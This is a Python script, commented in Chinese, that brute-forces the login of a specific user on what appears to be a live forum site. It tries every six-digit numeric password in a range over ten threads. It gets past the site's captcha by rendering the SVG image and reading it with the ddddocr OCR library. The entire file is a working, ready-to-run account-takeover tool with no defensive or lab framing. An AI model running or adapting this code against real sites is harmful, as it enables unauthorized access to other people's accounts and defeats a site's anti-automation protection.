import requests
import time
import os
import re
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class PasswordCracker:
    def __init__(self):
        self.base_url = os.environ.get('BASE_URL', 'https://mk48by049.mbbs.cc')
        self.target_username = os.environ.get('TARGET_USERNAME', 'shangde')
        self.api_base = f'{self.base_url}/bbs'
        self.captcha_url = f'{self.api_base}/login/captcha'
        self.login_url = f'{self.api_base}/login'
        
        # 解析密码范围
        segment = os.environ.get('PASSWORD_SEGMENT', '100000-199999')
        start, end = map(int, segment.split('-'))
        self.password_range = range(start, end + 1)
        
        # 优化配置：降低并发，增加超时时间
        self.max_workers = 10  # 从50降低到10，减少服务器压力
        self.found_password = None
        self.attempts = 0
        self.start_time = time.time()
        
        # 请求配置优化
        self.timeout = 10  # 增加超时时间
        self.retry_count = 2  # 重试次数
        
        # 初始化日志
        self.setup_logging()
        
        # 统计信息
        self.success_count = 0
        self.failure_count = 0
        self.captcha_failures = 0
        self.timeout_count = 0

    def setup_logging(self):
        """设置日志配置"""
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        log_filename = f"logs/password_cracker_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_filename, encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger(__name__)
        self.logger.info("🔐 密码爆破工具启动 - 优化版本")

    def init_ocr(self):
        """初始化OCR"""
        try:
            import ddddocr
            self.logger.info("✅ ddddocr 初始化成功")
            return ddddocr.DdddOcr(show_ad=False)
        except Exception as e:
            self.logger.error(f"❌ ddddocr 初始化失败: {e}")
            return None

    def improve_captcha_recognition(self, svg_content):
        """改进验证码识别"""
        try:
            import cairosvg
            # 尝试不同的DPI设置提高识别率
            for dpi in [150, 200, 250]:
                try:
                    png_data = cairosvg.svg2png(
                        bytestring=svg_content.encode('utf-8'),
                        output_width=300,
                        output_height=100,
                        dpi=dpi
                    )
                    if png_data:
                        return png_data
                except:
                    continue
            return None
        except Exception as e:
            self.logger.warning(f"⚠️ SVG转换失败: {e}")
            return None

    def get_captcha_with_retry(self, session, max_retries=3):
        """带重试的验证码获取"""
        for attempt in range(max_retries):
            try:
                resp = session.get(self.captcha_url, timeout=5)
                if resp.status_code == 200:
                    data = resp.json().get('data', {})
                    captcha_id, svg_data = data.get('id'), data.get('svg')
                    if captcha_id and svg_data:
                        return captcha_id, svg_data
                time.sleep(1)  # 失败后等待1秒
            except:
                time.sleep(1)
        return None, None

    def recognize_captcha_with_retry(self, svg_data, ocr, max_retries=3):
        """带重试的验证码识别"""
        for attempt in range(max_retries):
            png_data = self.improve_captcha_recognition(svg_data)
            if png_data:
                try:
                    result = ocr.classification(png_data)
                    cleaned = re.sub(r'[^A-Za-z0-9]', '', result).upper()
                    if cleaned and 3 <= len(cleaned) <= 6:  # 验证码通常3-6位
                        return cleaned
                except:
                    pass
            time.sleep(0.5)
        return None

    def try_password_with_retry(self, password, max_retries=2):
        """带重试的密码尝试"""
        for retry in range(max_retries):
            result = self._single_try(password, retry + 1)
            if result:  # 如果成功或应该停止
                return result
            if retry < max_retries - 1:
                time.sleep(1)  # 重试前等待
        return None

    def _single_try(self, password, attempt_num):
        """单次尝试"""
        if self.found_password:
            return "STOP"
            
        session = requests.Session()
        # 优化请求头
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Connection': 'keep-alive'
        })
        
        ocr = self.init_ocr()
        if not ocr:
            self.failure_count += 1
            return None
            
        self.attempts += 1
        
        try:
            # 获取验证码（带重试）
            captcha_id, svg_data = self.get_captcha_with_retry(session)
            if not captcha_id:
                self.captcha_failures += 1
                self.logger.debug(f"⚠️ 获取验证码失败 - 密码: {password}")
                return None
            
            # 识别验证码（带重试）
            captcha_text = self.recognize_captcha_with_retry(svg_data, ocr)
            if not captcha_text:
                self.captcha_failures += 1
                self.logger.debug(f"⚠️ 验证码识别失败 - 密码: {password}")
                return None
            
            # 尝试登录
            login_data = {
                'username': self.target_username,
                'password': str(password),
                'captcha_id': captcha_id,
                'captcha_text': captcha_text
            }
            
            resp = session.post(self.login_url, json=login_data, timeout=self.timeout)
            
            if resp.status_code == 200:
                result = resp.json()
                if result.get('success') and result.get('data'):
                    self.success_count += 1
                    self.logger.info(f"🎉🎉🎉 密码爆破成功! 密码: {password}")
                    return password
                else:
                    error_msg = result.get('message', '未知错误')
                    # 如果是密码错误，继续尝试；如果是其他错误，可能需要处理
                    if "密码" in error_msg or "password" in error_msg.lower():
                        self.logger.debug(f"❌ 密码错误: {password}")
                    else:
                        self.logger.warning(f"⚠️ 登录错误: {error_msg}")
            else:
                self.logger.warning(f"⚠️ HTTP错误: {resp.status_code}")
                
        except requests.exceptions.Timeout:
            self.timeout_count += 1
            self.logger.debug(f"⏰ 请求超时 - 密码: {password} (尝试 {attempt_num})")
            return None  # 超时可以重试
        except requests.exceptions.ConnectionError:
            self.failure_count += 1
            self.logger.warning(f"🔌 连接错误 - 密码: {password}")
            return None
        except Exception as e:
            self.failure_count += 1
            self.logger.error(f"💥 未知错误: {e}")
        
        return None

    def log_attempt_stats(self):
        """记录统计信息"""
        elapsed = time.time() - self.start_time
        rate = self.attempts / elapsed if elapsed > 0 else 0
        success_rate = (self.success_count / self.attempts * 100) if self.attempts > 0 else 0
        
        self.logger.info(f"📊 统计 - 尝试: {self.attempts}, 成功: {self.success_count}, "
                        f"超时: {self.timeout_count}, 验证码失败: {self.captcha_failures}, "
                        f"速率: {rate:.1f}次/秒, 成功率: {success_rate:.2f}%")

    def try_password(self, password):
        """包装函数用于线程池"""
        return self.try_password_with_retry(password)

    def run(self):
        """主运行函数"""
        self.logger.info(f"🚀 开始优化版密码爆破")
        self.logger.info(f"🎯 目标用户: {self.target_username}")
        self.logger.info(f"🔢 范围: {self.password_range[0]}-{self.password_range[-1]}")
        self.logger.info(f"🧵 并发线程: {self.max_workers}")
        self.logger.info(f"⏱️ 超时时间: {self.timeout}秒")
        self.logger.info(f"🔄 重试次数: {self.retry_count}")
        
        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                # 分批处理，避免内存占用过大
                batch_size = 1000
                passwords = list(self.password_range)
                
                for i in range(0, len(passwords), batch_size):
                    if self.found_password:
                        break
                        
                    batch = passwords[i:i + batch_size]
                    self.logger.info(f"🔍 处理批次 {i//batch_size + 1}/{(len(passwords)-1)//batch_size + 1}")
                    
                    futures = {executor.submit(self.try_password, pwd): pwd for pwd in batch}
                    
                    for future in as_completed(futures):
                        result = future.result()
                        if result and result != "STOP":
                            self.found_password = result
                            # 取消所有任务
                            for f in futures:
                                f.cancel()
                            break
                    
                    # 每批次完成后显示统计
                    self.log_attempt_stats()
                    
                    if self.found_password:
                        break
        
        except KeyboardInterrupt:
            self.logger.warning("⏹️ 用户中断执行")
        except Exception as e:
            self.logger.error(f"💥 执行错误: {e}")
        
        # 最终结果
        self.logger.info("=" * 60)
        if self.found_password:
            self.logger.info(f"✅ 爆破成功! 密码: {self.found_password}")
        else:
            self.logger.info("❌ 爆破完成，未找到密码")
        
        self.log_attempt_stats()

if __name__ == "__main__":
    cracker = PasswordCracker()
    cracker.run()
